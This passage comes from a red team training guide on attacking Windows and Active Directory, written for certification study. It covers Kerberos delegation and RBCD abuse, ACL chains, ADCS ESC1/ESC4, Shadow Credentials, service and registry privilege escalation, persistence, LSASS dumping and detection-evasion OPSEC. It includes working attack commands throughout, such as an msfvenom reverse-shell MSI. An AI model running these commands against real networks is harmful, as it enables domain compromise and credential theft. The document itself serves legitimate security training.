Get-ADComputer -Filter {TrustedForDelegation -eq $true} -Properties TrustedForDelegation
```

Note: All Domain Controllers have unconstrained delegation by design. Finding non-DC machines with this flag is the real finding.

---

### Constrained Delegation (S4U2Proxy)

**What it is**: A service can impersonate users but only to specific, admin-defined SPNs. Configured via `msDS-AllowedToDelegateTo` attribute on the service account.

**The S4U extension protocol**:

```
S4U2Self: "Give me a service ticket to MYSELF for any user — no password"
  → Any service account can call this
  → Returns a ticket for any user to that service
  → Used to get an impersonatable ticket

S4U2Proxy: "Use that ticket to get a service ticket to a target SPN"
  → The target SPN must be in msDS-AllowedToDelegateTo
  → Lets the service get a ticket to the target as that user
```

**Attack**: If you compromise a service account that has constrained delegation configured, you can impersonate any user (including Domain Admins) to the SPNs listed in `msDS-AllowedToDelegateTo`.

```
# Enumerate constrained delegation:
Get-DomainUser -TrustedToAuth | Select-Object samaccountname, msds-allowedtodelegateto
Get-DomainComputer -TrustedToAuth | Select-Object name, msds-allowedtodelegateto

# Exploit with Rubeus (you have svc_sql's password or hash):
Rubeus.exe s4u /user:svc_sql /password:Summer2019! /impersonateuser:Administrator /msdsspn:CIFS/db01.corp.local /ptt
```

---

### Resource-Based Constrained Delegation (RBCD)

**What it is**: In classic constrained delegation, the *source* service defines what it can delegate to. In RBCD, the *target* resource defines who is allowed to delegate to it — stored in `msDS-AllowedToActOnBehalfOfOtherIdentity` on the target computer object.

**Why RBCD is the most important delegation attack to know**: It requires only `GenericWrite` on a computer object — achievable through many ACL misconfiguration paths. No Domain Admin needed.

**The full 4-step RBCD chain**:

```
Prerequisite: You have GenericWrite on COMPUTER01 in AD

Step 1: Create a computer account you control (any domain user can create up to 10)
        addcomputer.py -computer-name 'ATTACKER$' -computer-pass 'P@ssw0rd' corp.local/jdoe:jdoepass

Step 2: Write ATTACKER$'s SID into COMPUTER01's msDS-AllowedToActOnBehalfOfOtherIdentity
        rbcd.py -delegate-to 'COMPUTER01$' -delegate-from 'ATTACKER$' -action write corp.local/jdoe:jdoepass

Step 3: Use S4U2Self to get a ticket for Administrator to ATTACKER$
        then S4U2Proxy to get a ticket for Administrator to CIFS/COMPUTER01
        getST.py -spn cifs/COMPUTER01.corp.local -impersonate Administrator -dc-ip 10.0.0.1 corp.local/ATTACKER$:P@ssw0rd

Step 4: Use the forged ticket
        KRB5CCNAME=Administrator.ccache smbclient.py COMPUTER01.corp.local
        → Full SYSTEM on COMPUTER01 with no password cracked
```

**Why this appears constantly in engagements**: `GenericWrite` on computer objects is a common misconfiguration (helpdesk can modify machines, legacy deployment scripts leave overly broad permissions). RBCD converts a single AD attribute write into full SYSTEM on that machine — and since you're impersonating a legitimate user via Kerberos, the traffic looks normal.

---

## 13. AD Object ACLs and BloodHound Paths

### Why AD objects have ACLs

Every object in Active Directory — users, groups, computers, OUs, GPOs, even the domain object itself — has a **DACL (Discretionary Access Control List)** just like files and registry keys do. A misconfigured ACL on a domain object is a lateral movement path or a privilege escalation path.

This is the entire reason BloodHound was built: to ingest all these ACLs and draw them as a graph showing attack paths that are invisible when looking at objects individually.

### Critical ACE types — what BloodHound surfaces

| ACE | Target object | What you can do |
|-----|---------------|----------------|
| `GenericAll` | User | Reset password, write any attribute, set SPN for Kerberoasting |
| `GenericAll` | Group | Add yourself as member |
| `GenericAll` | Computer | Write RBCD attribute → full chain to SYSTEM |
| `GenericWrite` | User | Write `msDS-KeyCredentialLink` → Shadow Credentials; write SPN → targeted Kerberoasting |
| `GenericWrite` | Computer | Write RBCD attribute → same as GenericAll on computer |
| `WriteDACL` | Any object | Modify the object's own DACL → grant yourself GenericAll |
| `WriteOwner` | Any object | Take ownership → then modify DACL → grant yourself everything |
| `ForceChangePassword` | User | Reset password without knowing current |
| `AllExtendedRights` | User | Reset password, read LAPS, includes DCSync rights if on domain object |
| `AddMember` | Group | Add any user to the group (e.g., direct Add to Domain Admins) |
| `DS-Replication-Get-Changes-All` | Domain object | DCSync — replicate all secrets from the DC |

### Chaining ACEs

Real engagement paths involve chains, not single ACEs:

```
Example chain (all from BloodHound "shortest path to DA"):
  jdoe has WriteDACL on GROUP_HELPDESK
  GROUP_HELPDESK has GenericAll on USER_svc_backup
  USER_svc_backup has WriteOwner on GROUP_DOMAIN_ADMINS

Attack:
  1. WriteDACL on GROUP_HELPDESK → grant jdoe AddMember
  2. Add jdoe to GROUP_HELPDESK
  3. GenericAll on svc_backup → reset svc_backup's password
  4. WriteOwner on Domain Admins → take ownership → grant AddMember
  5. Add jdoe to Domain Admins
```

Each step in BloodHound is an edge. Following edges from your current node to the "Domain Admins" node is the attack path.

### ACE abuse techniques

**GenericAll / GenericWrite on User → Shadow Credentials** (stealthier than password reset):

```
# Write a certificate keypair into msDS-KeyCredentialLink on the target user:
pywhisker.py -d corp.local -u jdoe -p jdoepass --target victim_user --action add
# Returns a .pfx certificate

# Use the certificate to authenticate and get a TGT + NT hash via PKINIT:
gettgtpkinit.py corp.local/victim_user -pfx-file victim.pfx victim.ccache
getnthash.py corp.local/victim_user -key aeskey
→ NT hash obtained without resetting the password → stealthy
```

**WriteDACL weaponisation**:

```
# Add DCSync rights to yourself via WriteDACL on the domain object:
Add-DomainObjectAcl -TargetIdentity "DC=corp,DC=local" -PrincipalIdentity jdoe -Rights DCSync
# Now you can DCSync as jdoe without being Domain Admin
secretsdump.py corp.local/jdoe:pass@dc01.corp.local
```

### AdminSDHolder and SDProp — the persistence mechanism no one talks about

**AdminSDHolder** is a special AD container object: `CN=AdminSDHolder,CN=System,DC=corp,DC=local`

Its DACL is used as a **template** for protected accounts and groups (Domain Admins, Enterprise Admins, Schema Admins, etc.). Every 60 minutes, a background process called **SDProp** resets the DACL on every member of these protected groups to match AdminSDHolder.

**Why this enables persistent privilege escalation**:

```
Normal ACL cleanup scenario:
  Defender notices jdoe has GenericAll on Domain Admins
  Defender removes the ACE from Domain Admins
  Attack path appears to be gone

AdminSDHolder persistence scenario:
  You added a GenericAll ACE for jdoe to AdminSDHolder
  SDProp runs every 60 minutes
  SDProp copies AdminSDHolder's DACL to Domain Admins, Enterprise Admins, etc.
  Your ACE is restored — automatically — on every protected group
  You wait 60 minutes and the path is back
```

**Exploit**:
```
# Add GenericAll to AdminSDHolder for your controlled user:
Add-DomainObjectAcl -TargetIdentity "AdminSDHolder" -PrincipalIdentity jdoe -Rights All
# Wait up to 60 minutes (or force it: Invoke-ADSDPropagation)
# Your user now has GenericAll on every DA, EA, and schema admin — automatically refreshed
```

**Detection**: Event 4780 (ACL set on member of admin group) fires when SDProp propagates. Defenders monitoring this event will see your ACEs reappearing — but most SIEMs aren't alerting on 4780.

---

## 14. ADCS — Active Directory Certificate Services

### Why ADCS matters

Active Directory Certificate Services is the Microsoft PKI solution — it issues X.509 certificates for user authentication, machine authentication, encryption, and code signing. It is present in the vast majority of enterprise environments. In 2021, SpecterOps published "Certified Pre-Owned" and the entire AD attack surface changed.

The core insight: **certificates can be used for Kerberos authentication (PKINIT)**. A certificate issued for a Domain Admin authenticates as that Domain Admin — no password needed, and the cert may be valid for years.

### PKINIT — Certificate-Based Kerberos Authentication

**PKINIT** is a Kerberos extension that allows using an X.509 certificate for pre-authentication instead of a password hash. If you get a certificate for a user, you get a TGT as that user.

```
Get certificate for DA (via ESC1 or Shadow Creds)
↓
gettgtpkinit.py corp.local/administrator -pfx-file admin.pfx admin.ccache
↓
Full TGT for Administrator — no password, no hash, just a cert
↓
Also extract NT hash via U2U Kerberos (used for Pass-the-Hash or further access):
getnthash.py corp.local/administrator -key <aes_key_from_above>
```

### Certificate Template Vulnerabilities

Certificate templates define what certs can be issued, to whom, and for what purpose. Misconfigurations in templates create exploitable paths.

**ESC1 — The Most Common Finding**

A template is vulnerable to ESC1 when:
1. The template allows **Subject Alternative Name (SAN)** to be specified by the requester
2. The template allows domain user enrollment (or a group you're in)
3. The certificate has `Client Authentication` EKU (Extended Key Usage)

```
Attack:
  certipy req -ca corp-CA -template VulnTemplate -upn administrator@corp.local -p jdoepass -u jdoe@corp.local
  → You requested a cert that says "this is administrator@corp.local"
  → The CA issues it because the template allows SAN
  
  certipy auth -pfx administrator.pfx -dc-ip 10.0.0.1
  → Full TGT as Domain Administrator
  → NT hash also extracted via PKINIT
```

**ESC4 — Template Write Permissions**

If you have write permissions on a certificate template object itself (GenericWrite, WriteDACL, etc.), you can modify an existing non-vulnerable template to become ESC1 — then exploit it:

```
# Backup original template settings, modify it to allow SAN + user enrollment:
certipy template -template TargetTemplate -save-old -u jdoe@corp.local -p pass -dc-ip 10.0.0.1
# Now exploit it as ESC1
certipy req -ca corp-CA -template TargetTemplate -upn administrator@corp.local ...
# Then restore (or don't, if you want persistence):
certipy template -template TargetTemplate -configuration old.json ...
```

### Shadow Credentials — GenericWrite Without ADCS

Shadow Credentials doesn't require an ADCS CA — it abuses the `msDS-KeyCredentialLink` attribute that stores key material for Windows Hello for Business. If you have `GenericWrite` on a user object, you can add your own certificate as their authentication key and authenticate as them via PKINIT.

```
# Add your key to the target user:
pywhisker.py -d corp.local -u jdoe -p pass --target target_user --action add
# Returns: [+] Saved PFX to: xYzAbCd.pfx

# Authenticate with the added key (PKINIT):
gettgtpkinit.py corp.local/target_user -pfx-file xYzAbCd.pfx target.ccache

# Get the NT hash (for Pass-the-Hash or just to store):
export KRB5CCNAME=target.ccache
getnthash.py corp.local/target_user -key <aes_key>
```

This is stealthier than password reset (the target can still log in; you haven't changed their password) and leaves no ADCS CA logs. Detection is through changes to `msDS-KeyCredentialLink` (LDAP modification events).

### Enumerate ADCS

```
# certipy finds all vulnerable templates in one command:
certipy find -u jdoe@corp.local -p pass -dc-ip 10.0.0.1 -stdout
# Look for: ESC1, ESC2, ESC3, ESC4, ESC6, ESC8 in the output
# ESC1 is by far the most common
```

---

## 15. The Windows Registry

### What it is

A hierarchical key-value database that stores configuration for Windows and installed applications. Keys are folders; values are files.

### The five top-level hives

| Hive | Short | Contents |
|------|-------|----------|
| `HKEY_LOCAL_MACHINE` | HKLM | System-wide settings, services, hardware config |
| `HKEY_CURRENT_USER` | HKCU | Settings for the logged-on user |
| `HKEY_USERS` | HKU | Settings for all user profiles |
| `HKEY_CLASSES_ROOT` | HKCR | COM registrations, file associations |
| `HKEY_CURRENT_CONFIG` | HKCC | Current hardware profile |

### Keys relevant to red teaming

| Key | Attack relevance |
|-----|-----------------|
| `HKLM\SYSTEM\CurrentControlSet\Services\` | Service binary paths → privesc |
| `HKLM\SAM` | Local account hashes → credential dumping |
| `HKLM\SECURITY` | LSA secrets, cached domain creds |
| `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon` | AutoLogon passwords |
| `HKCU\...\CurrentVersion\Run` | User-level autorun → persistence |
| `HKLM\...\CurrentVersion\Run` | System-level autorun → persistence |
| `HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer` | AlwaysInstallElevated |
| `HKCU\SOFTWARE\Classes\CLSID\` | User COM registrations → COM hijacking |
| `HKLM\SYSTEM\CurrentControlSet\Control\Lsa` | PPL, WDigest, auth config |

### AlwaysInstallElevated — registry privesc

If both keys are set to 1, any user can install an MSI package and it runs as SYSTEM:

```
# Check:
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

# Exploit:
msfvenom -p windows/x64/shell_reverse_tcp LHOST=... LPORT=... -f msi -o evil.msi
msiexec /quiet /qn /i evil.msi
# Runs as SYSTEM
```

---

## 16. Windows Services

### What a service is

A long-running background process managed by the **SCM (Service Control Manager)**. Services start at boot, run without a user session, and are configured at `HKLM\SYSTEM\CurrentControlSet\Services\`.

Each service has: binary path, start type, and logon account (SYSTEM, Network Service, Local Service, or specific account).

### Three privesc surfaces

**1. Weak binary permissions** — the `.exe` is writable by non-admin users. Replace it with your beacon. Service restart → your code runs as the service identity.

```
icacls "C:\path\to\service.exe" | findstr /i "Users\|Everyone\|BUILTIN\Users"
# (F)=full, (W)=write, (M)=modify → exploitable
```

**2. Unquoted service paths** — path `C:\Program Files\My App\service.exe` without quotes. Windows tries:
```
C:\Program.exe          ← tries this first
C:\Program Files\My.exe ← tries this second
C:\Program Files\My App\service.exe ← real binary
```
If `C:\Program Files\` is writable, drop `My.exe` there. Windows runs it as the service identity before reaching the real binary.

**3. Weak service object ACL** — you have `SERVICE_CHANGE_CONFIG` rights on the service object itself. Change its binary path directly:
```
sc config VulnSvc binpath= "C:\temp\beacon.exe"
sc start VulnSvc
```

> **Mental model**: Services are trusted overnight employees. Weak binary perms = you swapped their ID badge. Unquoted paths = you set up a fake office at an earlier address. Weak service ACL = you have their HR form and can reassign them yourself.

---

## 17. Scheduled Tasks

### What they are

Windows' cron equivalent — programs run at triggers (time, logon, system startup, WMI event) or on a schedule. Managed by the **Task Scheduler** service (separate from SCM). Stored as XML in `C:\Windows\System32\Tasks\`.

### Why they matter

**User-level persistence (no admin needed)**:
```
schtasks /create /tn "WindowsUpdate" /tr "C:\Users\Public\beacon.exe" /sc onlogon /ru %USERNAME% /f
```

**SYSTEM-level persistence (admin required)**:
```
schtasks /create /tn "SystemCheck" /tr "C:\Windows\Temp\beacon.exe" /sc onstart /ru SYSTEM /f
```

**Key difference from services**: Services run continuously. Tasks run at a trigger then exit. For a beacon with its own sleep loop, either works. But tasks blend in with hundreds of built-in maintenance tasks and are less scrutinised during incident response.

**Enumerate non-Microsoft tasks**:
```
Get-ScheduledTask | Where-Object {$_.TaskPath -notlike "\Microsoft\*"}
```

---

## 18. WMI — Windows Management Instrumentation

### What WMI is

WMI is Windows' built-in management framework — a database of system information (processes, services, hardware, event logs) with an API that lets you query and modify it locally or remotely.

### Why WMI matters for red teaming

**1. Remote code execution (lateral movement)**:
```
wmic /node:192.168.1.10 /user:CORP\jdoe /password:P@ss process call create "cmd.exe /c beacon.exe"
# Or cleaner:
wmiexec.py CORP/jdoe:P@ss@192.168.1.10
```

**2. Stealthy persistence via event subscriptions**:

WMI event subscriptions fire a command when an event occurs (user logon, system startup, etc.). They persist across reboots and live entirely in the WMI repository — no files, no registry Run keys, no services.

```
# Three components needed:
__EventFilter     → defines the trigger (e.g., "user logged on")
__EventConsumer   → defines the action (e.g., "run this command")
__FilterToConsumerBinding → links filter to consumer

# Tooling:
PowerLurk / WMImplant for creation
wmic /namespace:\\root\subscription path __EventFilter get Name
```

**3. Reconnaissance**:
Nearly every offensive tool uses WMI for local enumeration — listing services, processes, installed software, patch level.

> WMI execution is not as stealthy as advertised. It generates `Microsoft-Windows-WMI-Activity/Operational` events (Event 5857, 5860, 5861) and Sysmon Event 20 (WMI Consumer Activity). WMI *persistence* however is rarely monitored well.

---

## 19. LSASS, SAM, and NTDS.dit

### LSASS — Where Credentials Live

**LSASS (Local Security Authority Subsystem Service)** handles every authentication. Because it manages credentials, it caches them:

| Credential type | Cached by default? | Notes |
|----------------|-------------------|-------|
| NT hashes | Yes | All interactively logged-on users |
| Kerberos TGTs + session keys | Yes | Domain users |
| DPAPI master keys | Yes | Browser passwords, Credential Manager |
| Cleartext (WDigest) | No | Disabled since Win 8.1; can be re-enabled via registry |

### The LSASS dump chain

```
1. Escalate to SYSTEM (needs SeDebugPrivilege)
2. Open LSASS with PROCESS_VM_READ
3. MiniDumpWriteDump() → lsass.dmp
4. Transfer to Kali
5. pypykatz lsa minidump lsass.dmp
   → Extract NT hashes → Pass-the-Hash
   → Extract Kerberos tickets → Pass-the-Ticket
```

### PPL (Protected Process Light)

PPL prevents processes — even SYSTEM — from opening a protected process for read/write. LSASS can run as PPL on modern Windows.

```
# Check:
Get-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" -Name "RunAsPPL"
# 1 = PPL enabled

# Enable PPL (if you want to harden your lab):
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v RunAsPPL /t REG_DWORD /d 1 /f
```

PPL bypass requires: a kernel driver (BYOVD — Bring Your Own Vulnerable Driver to patch kernel protections), nanodump's process snapshot bypass (`--snapshot`), or MalSecLogon. Full bypasses are Phase 08 content. Here: understand why the technique exists.

### SAM vs NTDS.dit — know the difference

| | SAM | NTDS.dit |
|---|---|---|
| **What it stores** | NT hashes for **local** accounts only | NT hashes for **all domain** accounts |
| **Where it lives** | `C:\Windows\System32\config\SAM` | `C:\Windows\NTDS\NTDS.dit` (DC only) |
| **How to dump** | `secretsdump.py -sam` or `reg save HKLM\SAM` | DCSync (no file access needed) |
| **What it gets you** | Local admin access on this one machine | Every account in the domain + krbtgt |
| **Required access** | Local SYSTEM | DCSync rights (or physical DC access) |

### Logon types and credential caching — which logons leave hashes

Not every authentication leaves NT hashes in LSASS. This determines which machines are worth dumping.

| Logon Type | Description | Leaves NT hash in LSASS? |
|-----------|-------------|------------------------|
| Type 2 — Interactive | Keyboard logon, `runas` | **Yes** |
| Type 3 — Network | SMB, WMI, `net use` | **No** |
| Type 4 — Batch | Scheduled tasks | **Yes** (for task's account) |
| Type 5 — Service | Service logon | **Yes** (for service account) |
| Type 10 — RemoteInteractive | RDP | **Yes** |
| Type 11 — CachedInteractive | Logon using cached domain credentials (offline/airgapped) | **Yes** (cached hash stored in registry) |
| Type 9 — NewCredentials | `runas /netonly` | **No** (original token kept locally) |

**Type 11 specifically**: When a domain machine can't reach the DC, Windows falls back to a cached credential hash stored at `HKLM\SECURITY\Cache`. These are MSCACHE2 (DCC2) hashes — slow to crack (10,000 iterations), but valuable on airgapped machines or after network segmentation.

**Operational implication**: A DA who RDPs to a machine leaves their hash in LSASS on that machine. A DA who connects via SMB (Type 3) does not. Finding machines where DAs have RDP'd is a core enumeration objective.

---

## 20. Event Logs — What You Leave Behind

### The infrastructure

**Windows Event Log** (always present):
- `Security`: Authentication, process creation, object access
- `System`: Service installs, driver loads
- `Application`: App-specific

**Sysmon** (free Microsoft tool, must be installed):
- More granular than native logs
- Process creation with full command lines
- LSASS access attempts
- Network connections with process names

**EDR telemetry** (via ETW kernel providers):
- Syscall-level visibility
- Memory allocation patterns
- Process injection detection
- Operates below Sysmon, cannot be silenced by disabling Sysmon

### Events you generate — and what they reveal

| Your action | Event ID | Log | What defender sees |
|-------------|----------|-----|-------------------|
| Network logon (PtH, SMB, WMI) | 4624 Type 3 | Security (target) | Logon from source IP |
| RDP logon | 4624 Type 10 | Security (target) | Full logon with creds cached |
| Failed logon | 4625 | Security | Single account: brute force. Multiple accounts: spray |
| Process creation | 4688 | Security | Beacon spawning children |
| Service installed | 7045 | System | New service with binary path |
| LSASS opened | Sysmon 10 | Sysmon | Source process + access rights |
| Network connection | Sysmon 3 | Sysmon | Process name + remote IP + port |
| PowerShell scriptblock | 4104 | PowerShell | Full script content |
| Kerberos TGT requested | 4768 | DC Security | Every AS-REQ |
| AS-REP Roasting | 4768 pre-auth type 0 | DC Security | No pre-auth flag — distinguishable from normal requests |
| Kerberoasting | 4769 with RC4 (0x17) | DC Security | RC4 ticket in AES environment = signal |
| DCSync | 4662 on domain object | DC Security | Replication access from non-DC |
| Golden Ticket use | 4769 anomalies | DC Security | Username in ticket doesn't match any real account |
| Silver Ticket use | **No KDC event** | — | Never visible at the DC — stealth advantage |
| Group member added | 4728 / 4732 | DC Security | Shadow DA additions |
| AdminSDHolder ACE prop | 4780 | DC Security | SDProp copied ACE to protected group |
| Password spray | Burst of 4625 across many accounts | Security | vs brute force: many 4625 on one account |
| WMI consumer created | 5861 | WMI-Activity | Persistence subscription |
| DPAPI key export | Sysmon 11 | Sysmon | Large .pfx / .pvk file creation |

### The OPSEC question — ask it before every action

> "What is the minimum footprint to achieve my objective?"

**Kerberoasting OPSEC**:
- Requesting all service tickets at once → burst of 4769s → alert
- Requesting RC4 when environment default is AES → 4769 RC4 flag → alert
- Better: request AES (`/enctype:aes256`) + one at a time, spaced out

**Lateral movement OPSEC comparison**:

| Method | Creates service? | Drops file? | Logon type | Main artifact |
|--------|-----------------|-------------|------------|---------------|
| PsExec | Yes (7045) | Yes | Type 3 | Service install event |
| WMI exec | No | No | Type 3 | WMI-Activity logs |
| WinRM | No | No | Type 3 | WinRM logs |
| DCOM | No | No | Type 3 | Minimal |

---

## 21. The Red Team Mindset

### Think in trust relationships, not vulnerabilities

Vulnerabilities get patched. Trust relationships are architectural.

- Kerberoasting isn't a bug — it's a consequence of how Kerberos works (any user can request any service ticket)
- RBCD attacks aren't a bug — they're a misconfigured attribute write permission
- AdminSDHolder persistence isn't a bug — it's the SDProp design being weaponised

**The right question**: *Who does Windows trust to do X? Can I become that entity?*

### Think in chains, not single steps

```
Low-priv domain user (assumed breach)
  ↓ Local enumeration
  ↓ Local privilege escalation (SYSTEM on foothold)
  ↓ Credential dump (LSASS → hashes + tickets)
  ↓ AD enumeration (BloodHound — what edges exist from here?)
  ↓ Follow edges (ACL abuse, delegation, Kerberoasting)
  ↓ Lateral movement (reach a more valuable machine)
  ↓ Repeat (dump more creds, enumerate more paths)
  ↓ Domain privilege escalation (DA, DCSync rights)
  ↓ DCSync → krbtgt → Golden Ticket + AdminSDHolder persistence
```

Every step answers: "What new trust relationship does this give me access to?"

### Think in what you leave behind

Before any technique: What event logs? Disk write? New process? Network connection? Quieter alternative?

### The assumed breach model

The exam starts with low-privileged domain credentials. No phishing needed — the foothold is given. Your job is to demonstrate what a real attacker does from that position. This is why enumeration comes before exploitation — you map the environment before moving through it.

---

## 22. Build Your Lab

### Option A: Fully local (16 GB RAM recommended)

```bash
# Three VMs:
# Kali Linux (attacker)     — 4 GB RAM, 2 CPUs
# Windows Server 2019 (DC)  — 4 GB RAM, 2 CPUs
# Windows 10 (victim)       — 4 GB RAM, 2 CPUs

# Promote DC:
Add-WindowsFeature AD-Domain-Services
Install-ADDSForest -DomainName "lab.local"

# Create lab accounts:
New-ADUser -Name "jdoe" -AccountPassword (ConvertTo-SecureString "Password1" -AsPlainText -Force) -Enabled $true

# Kerberoastable service account:
New-ADUser -Name "svc_sql" -AccountPassword (ConvertTo-SecureString "Summer2019!" -AsPlainText -Force) -Enabled $true
Set-ADUser svc_sql -PasswordNeverExpires $true
setspn -A MSSQLSvc/win10.lab.local:1433 svc_sql

# Misconfigured delegation (for RBCD practice):
Set-ADComputer WIN10 -TrustedForDelegation $true  # unconstrained
```

### Populate with realistic misconfigurations (BadBlood)

```bash
git clone https://github.com/davidprowe/BadBlood
cd BadBlood
# Adds 2,500 users, nested groups, SPNs, delegation configs, and ACL misconfigs
# Turns your lab from a clean domain into something that looks like a real enterprise
.\Invoke-BadBlood.ps1
```

### Option B: GOAD (most realistic, 16 GB+ RAM)

```bash
git clone https://github.com/Orange-Cyberdefense/GOAD
cd GOAD
# Use GOAD-Light (3 VMs) if RAM is limited
# Multi-domain environment with real misconfigurations built in
# The closest thing to a real enterprise without being one
```

### Install Sysmon with a proper config (not the default)

```powershell
# SwiftOnSecurity config — what a real defender runs:
Invoke-WebRequest https://raw.githubusercontent.com/SwiftOnSecurity/sysmon-config/master/sysmonconfig-export.xml -OutFile sysmon.xml
.\Sysmon64.exe -accepteula -i sysmon.xml

# This gives you realistic detection telemetry so you learn what your actions look like
# to defenders — not just whether the technique worked
```

### Option C: TryHackMe (~£14/month)

No local hardware needed. Start with:
- Windows Fundamentals 1–3 (free) — Week 1
- Windows Internals (free) — Week 1
- Active Directory Basics (free) — Week 1
- Attacking Kerberos (free) — Week 2
- Windows PrivEsc (subscription) — Week 2

---

## 23. Free Learning Resources

| Resource | What to study here | Priority |
|----------|--------------------|---------|
| [ired.team](https://www.ired.team) | Technique deep-dives with code examples | **High — read daily** |
| [adsecurity.org (Sean Metcalf)](https://adsecurity.org) | Gold standard AD attack reference | **High** |
| [posts.specterops.io](https://posts.specterops.io) | BloodHound team: ADCS, RBCD, delegation | **High** |
| [github.com/GhostPack](https://github.com/GhostPack) | Rubeus, Seatbelt, SharpHound source — read the code | Reference |
| [Certified Pre-Owned (whitepaper)](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf) | ADCS attacks — mandatory read before Phase 14 | **Essential** |
| [THM: Windows Fundamentals 1–3](https://tryhackme.com/room/windowsfundamentals1xbx) | Interactive Windows basics | Week 1 |
| [THM: Windows Internals](https://tryhackme.com/room/windowsinternals) | Processes, handles, DLLs | Week 1 |
| [THM: Active Directory Basics](https://tryhackme.com/room/winadbasics) | AD structure and Kerberos | Week 1 |
| [THM: Attacking Kerberos](https://tryhackme.com/room/attackingkerberos) | Kerberos attacks hands-on | Week 2 |
| [MITRE ATT&CK](https://attack.mitre.org) | Framework mapping all techniques to TTPs | Ongoing |
| [Windows Internals 7th Ed (Russinovich)](https://learn.microsoft.com/en-us/sysinternals/resources/windows-internals) | Definitive reference for Sections 1–3 | Reference |
| [harmj0y blog](https://blog.harmj0y.net) | Deep dives on tokens, Kerberos, delegation | Reference |

---

## 24. Phase 00 Mastery Checklist

Don't move to Phase 01 until you can answer **all of these without looking**.

### Architecture
- [ ] What is the difference between kernel mode and user mode? What happens if kernel-mode code crashes?
- [ ] What is a handle and what determines the access rights it grants?
- [ ] What is a DLL? Name the DLL search order and explain why KnownDLLs cannot be hijacked from user space.
- [ ] Why do attackers target non-KnownDLL dependencies specifically?

### Identity and Tokens
- [ ] Write out the structure of a full domain SID and identify each component.
- [ ] What is RID 512? RID 519? What is S-1-5-18?
- [ ] What is the difference between a primary token and an impersonation token?
- [ ] Name the four token impersonation levels. Which level do Potato attacks produce and why does that limit lateral movement?
- [ ] What does `SeImpersonatePrivilege` grant and why does every service account have it?
- [ ] What does `SeDebugPrivilege` grant and why is it needed to dump LSASS?

### Integrity and UAC
- [ ] Name the four main integrity levels in order. At what level does a normal user process run, even if the user is a local admin?
- [ ] Why does a local admin account still run processes at Medium integrity?
- [ ] Explain in two sentences why FodHelper UAC bypass works.
- [ ] How do you check your current integrity level from the command line?

### AMSI and Detection
- [ ] What is AMSI and at what point does it scan content?
- [ ] Why does encoding a payload before writing it to disk not bypass AMSI?
- [ ] Where do EDR usermode hooks live and what function do they intercept?
- [ ] Why do direct syscalls bypass EDR usermode hooks?

### COM and IPC
- [ ] What is a CLSID? Where is it registered?
- [ ] How does COM hijacking use HKCU to override HKLM without admin rights?
- [ ] What is a named pipe? How does `ImpersonateNamedPipeClient` produce a SYSTEM token?
- [ ] Explain in three sentences why Potato attacks work, using the words "named pipe", "SYSTEM", and "SeImpersonatePrivilege".

### NTLM and Coercion
- [ ] What is the difference between an NT hash and a NetNTLMv2 response?
- [ ] Why can you Pass-the-Hash with an NT hash but not with NetNTLMv2?
- [ ] What is NTLMv1 downgrade and why is the resulting hash easier to crack?
- [ ] Name two NTLM coercion primitives and which Windows service each abuses.
- [ ] Describe the coercion → relay → RBCD → SYSTEM chain in five steps.

### Kerberos
- [ ] Draw the Kerberos AS-REQ / TGS-REQ / AP-REQ flow from memory.
- [ ] What is the PAC? What does it contain? Why does Golden Ticket work if the KDC validates PAC signatures?
- [ ] What is the difference between a Golden Ticket and a Silver Ticket? Which one never generates a KDC event?
- [ ] Why does Kerberoasting require no special privileges?
- [ ] What is Overpass-the-Hash and why is it better OPSEC than Pass-the-Hash in NTLM-monitored environments?
- [ ] Explain `createnetonly` in Rubeus and why it improves OPSEC over injecting into your current session.

### Kerberos Delegation
- [ ] What flag on a computer object indicates unconstrained delegation? What credential does an attacker gain when any user authenticates to that machine?
- [ ] How does coercing a DC to authenticate to an unconstrained delegation machine lead to DCSync?
- [ ] What is S4U2Self? What does it let a service do without knowing the user's password?
- [ ] Walk through the four steps of an RBCD attack from `GenericWrite` on a computer object to a shell.

### AD ACLs and BloodHound
- [ ] You have `GenericWrite` on a user object. Name two attacks you can execute.
- [ ] What is `WriteDACL` and how do you weaponise it in two steps to get DCSync?
- [ ] What is AdminSDHolder? How does SDProp persistence survive cleanup of Domain Admins?
- [ ] What event ID fires when SDProp copies an ACE back to a protected group?

### ADCS
- [ ] What is ESC1? What two template properties must be misconfigured for it to be exploitable?
- [ ] What is PKINIT and what does it give you when combined with a cert for a DA?
- [ ] What are Shadow Credentials and which AD attribute do you write to abuse them?
- [ ] ESC1 requires a CA. Shadow Credentials does not. What does Shadow Credentials require instead?

### Registry and Services
- [ ] Name three registry locations used for persistence and why each one works.
- [ ] What is AlwaysInstallElevated and which two registry keys must both be set?
- [ ] What is an unquoted service path and why does it allow privilege escalation?
- [ ] What is the difference between weak binary permissions and a weak service object ACL?

### Tasks and WMI
- [ ] What is the key operational difference between a service and a scheduled task as a persistence mechanism?
- [ ] Why is WMI event subscription persistence harder to detect than registry Run keys?

### Credential Storage
- [ ] Name three credential types LSASS caches.
- [ ] What is the difference between SAM and NTDS.dit? Which requires DCSync rights to dump?
- [ ] Which logon types leave NT hashes in LSASS and which do not?
- [ ] What is a Type 11 logon and where does it store its cached credential?
- [ ] What is PPL and what is required to bypass it?

### Event Logs and OPSEC
- [ ] What event ID is generated when a new service is installed and which log is it in?
- [ ] What event ID and field distinguishes Kerberoasting from normal TGS requests?
- [ ] Why do Silver Tickets generate no KDC-side events?
- [ ] Before running any technique, what five questions do you ask about its footprint?

### Mindset
- [ ] What is the assumed breach model?
- [ ] Walk the full attack chain from low-priv domain user to Golden Ticket, naming each step.
- [ ] Explain the difference between a vulnerability and a trust relationship.

---

## Next Phase

→ **Phase 01: Red Team Infrastructure & OPSEC** — building the C2 before you need it under pressure
